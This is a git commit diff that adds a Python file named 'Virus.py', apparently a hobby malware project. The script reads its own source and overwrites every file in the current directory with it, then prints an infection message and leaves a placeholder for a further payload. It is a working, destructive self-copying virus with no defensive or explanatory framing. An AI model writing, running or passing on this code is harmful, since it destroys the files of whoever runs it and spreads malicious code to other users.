d0f09f9d548d07ed88e0c048d46a57495ba16282
TheSilverGorilla <83459890+TheSilverGorilla@users.noreply.github.com>
2021-08-25 12:30:48 -0500

    Update Virus.py
    Going to update this soon.

--- Virus.py
+++ Virus.py
@@ -1,1 +1,12 @@
-
+import sys
+import os
+script = sys.argv[0]
+direct = [i for i in os.listdir()]
+with open(script, 'r') as f:
+    read = f.read()
+for i in direct:
+    with open(i, 'w') as w:
+        w.write(read)
+if (open(direct[0]).read()) == read:
+    print("Viral Load Infected Directory Files.")
+    #Payload in here.
